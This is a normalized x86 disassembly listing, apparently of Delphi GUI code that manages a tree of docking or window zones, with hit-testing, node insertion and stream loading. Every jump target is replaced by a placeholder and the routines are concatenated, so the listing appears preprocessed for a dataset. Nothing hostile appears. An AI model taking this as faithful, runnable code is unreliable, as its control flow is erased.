cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_446574
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_446574
mov ecx ebx
pop edx
call sub_4129d8
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43d7b8
mov eax [ ebp - 0x4 ]
call sub_4469a8
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_4469a8
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4469a8
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_4469a8
push ebx
mov ebx eax
mov eax ebx
call sub_4464b0
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_446438
test al al
je r-xdata
mov eax ebx
call sub_4464e4
pop ebx
retn
sub_4469e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4469d0
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_446480
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4469d4
mov edx esi
call sub_4469e4
sub_446a20
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4469a8
mov edi eax
mov eax ebx
call sub_4464e4
cmp edi eax
jl r-xdata
mov eax esi
call sub_446690
mov eax [ esi + 0x1c ]
push eax
push sub_448530
mov edx esi
call sub_446d5c
mov eax ebx
call sub_4469a8
mov edi eax
mov eax esi
call sub_44652c
cmp edi eax
jle r-xdata
mov eax ebx
call sub_446a20
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_446a8c
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4464b0
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_446ab4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403270
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_4035c4
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44645c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41da44
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_4241ec
mov edx eax
mov eax ebx
call sub_41dbc0
mov eax [ ebp - 0x4 ]
call sub_446c84
xor eax eax
push ebp
push sub_446bc0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_441328
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_446690
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446bc7
mov eax [ ebp - 0x4 ]
call sub_446c88
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4412ec
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_446bc7
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_448a58
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_446c1c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_447c88
mov eax [ esi + 0x10 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_446c9c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_446c9c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_446c9c
pop ecx
sub_446cf4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_446c9c
pop ecx
sub_446d20
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_446d20
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_446d20
pop ecx
sub_446d74
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_446cf4
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_4465e0
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_4465e0
push eax
mov edx 0x1
mov eax ebx
call sub_446574
push eax
mov edx 0x2
mov eax ebx
call sub_446574
pop edx
pop ecx
call sub_4129d8
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402cbc
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_446df8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_446830
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_4129d8
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43d7b8
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44645c
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_446cf4
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_446480
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_447d20
mov edx esi
mov eax ebx
call sub_446cf4
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_43dd9c
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44645c
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_43dd88
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_4465e0
mov edx eax
mov eax edi
call sub_4469d0
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_4465e0
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_4465e0
mov edx eax
mov eax edi
call sub_4469d0
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_4465e0
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_447008
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_4471b0
jmp r-xdata
sub_447008
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44645c
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_4469a8
mov edx eax
mov eax ebx
call sub_4469d0
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_4469d0
mov eax [ esi + 0x64 ]
call sub_4469a8
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_448078
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_446d5c
mov eax [ esi + 0x64 ]
call sub_4469a8
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_448078
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_446d5c
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_4483fc
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_446d5c
mov eax [ esi + 0x64 ]
call sub_4469a8
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_448530
xor edx edx
mov eax esi
call sub_446d5c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_4469d0
adc edx 0x0
mov eax ebx
call sub_446690
mov eax ebx
call sub_446a20
push esi
push sub_448530
xor edx edx
mov eax esi
call sub_446d5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_4471b0
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_446690
mov eax [ ebx + 0x14 ]
call sub_446a20
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_447228
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_4469a8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_4469a8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_4469a8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_446574
mov esi eax
mov edx 0x2
mov eax ebx
call sub_446574
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_4469a8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_446a80
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_446aa8
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446a80
call sub_447228
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446aa8
call sub_447228
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_4465e0
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_4465e0
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_447454
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_441328
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_4412ec
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_412988
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4474e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_447454
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_446aa8
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_446cf4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_446aa8
call sub_447228
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_447570
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_404074
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4046c0
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_4475b8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4477b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_447c88
mov eax [ ebp - 0x8 ]
call sub_446c84
xor edx edx
push ebp
push sub_447793
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44779a
mov eax [ ebp - 0x8 ]
call sub_446c88
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44645c
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_447570
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_40349c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_44677c
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_447570
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_43dd18
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_43eb10
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_4032a0
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
